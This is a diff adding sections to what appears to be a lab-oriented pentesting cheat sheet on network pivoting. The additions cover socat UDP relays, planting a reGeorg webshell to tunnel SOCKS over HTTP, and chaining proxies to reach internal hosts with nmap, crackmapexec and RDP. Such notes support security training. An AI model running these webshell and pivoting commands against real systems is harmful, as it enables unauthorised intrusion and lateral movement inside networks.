@@ -21,6 +21,7 @@ Use a compromised host (pivot/beachhead) to relay traffic into internal network 
 | `rpivot` | Reverse SOCKS proxy for restricted egress environments |
 | `socat` | Port relay and forwarding |
 | `dnscat2` | DNS-tunneled C2 + covert pivoting |
+| `reGeorg` | HTTP tunnel via uploaded webshell — SOCKS proxy over HTTP when no direct egress |
 
 ---
 
@@ -385,6 +386,23 @@ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
 socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
 ```
 
+### UDP Pivoting via Socat
+
+For services that use UDP (DNS, SNMP, NTP) — TCP tunnels won't carry them; relay with socat on the pivot host.
+
+```bash
+# Forward UDP port 53 from pivot → internal DNS server
+# Run on pivot host:
+socat UDP4-LISTEN:53,fork UDP4:172.16.5.10:53
+
+# Forward UDP 161 (SNMP) → internal host
+socat UDP4-LISTEN:161,fork UDP4:172.16.5.20:161
+
+# Then query against pivot's IP from attacker:
+snmpwalk -v2c -c public 10.129.202.64 1.3.6.1.2.1.1
+dig @10.129.202.64 inlanefreight.local
+```
+
 ---
 
 ## sshuttle
@@ -566,6 +584,59 @@ ssh -p 8022 user@localhost -D 9050 -N
 
 ---
 
+## reGeorg (HTTP Tunnel via Webshell)
+
+When no direct TCP egress is available from the pivot but the web server accepts uploads — drop a tunnel webshell and SOCKS proxy through HTTP requests.
+
+```bash
+# Clone
+git clone https://github.com/sensepost/reGeorg.git
+
+# Upload the appropriate webshell to the target's web root
+# PHP:  tunnel.php
+# ASPX: tunnel.aspx
+# JSP:  tunnel.jsp
+# Tomcat: tunnel.war → extract tunnel.jsp into webroot
+
+# Start the SOCKS proxy — points at the uploaded shell
+python3 reGeorgSocksProxy.py -p 1080 -u http://target.com/tunnel.php
+
+# Use via proxychains
+# /etc/proxychains.conf: socks5 127.0.0.1 1080
+proxychains nmap -sT -Pn -p22,445,3389 172.16.5.19
+```
+
+> [!note] reGeorg tunnels TCP over HTTP POST requests. It's slow but works when only port 80/443 egress is allowed. Requires a web shell upload vector (file upload vuln, LFI write, CMS plugin upload, etc.).
+
+---
+
+## Multi-Hop Proxychains
+
+When you have two independent SOCKS proxies pointing at different pivot hops, chain them in `/etc/proxychains4.conf`. Traffic goes through each proxy in order.
+
+```bash
+# /etc/proxychains4.conf — chain two pivots
+# Proxy 1: chisel SOCKS on pivot1 at port 1080
+# Proxy 2: SSH -D SOCKS on pivot2 at port 9050 (reachable via pivot1)
+
+[ProxyList]
+socks5  127.0.0.1 1080    # hop 1 — pivot1 (chisel/SSH to 10.129.x.x)
+socks5  127.0.0.1 9050    # hop 2 — pivot2's SOCKS (reachable through hop 1)
+```
+
+```bash
+# Verify chain is working
+proxychains4 curl http://172.16.6.10    # only reachable via pivot1 → pivot2
+
+# Use tools normally — proxychains handles the chain transparently
+proxychains4 crackmapexec smb 172.16.6.0/24
+proxychains4 xfreerdp /v:172.16.6.25 /u:admin /p:pass@123
+```
+
+> [!tip] Use `strict_chain` mode (default in proxychains4) to ensure all proxies are used in order and fail loudly if one is unreachable. Use `dynamic_chain` if one proxy may be offline.
+
+---
+
 ## Tool Selection Guide
 
 | Scenario | Recommended tool |
@@ -624,5 +695,5 @@ WINDOWS PIVOT
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
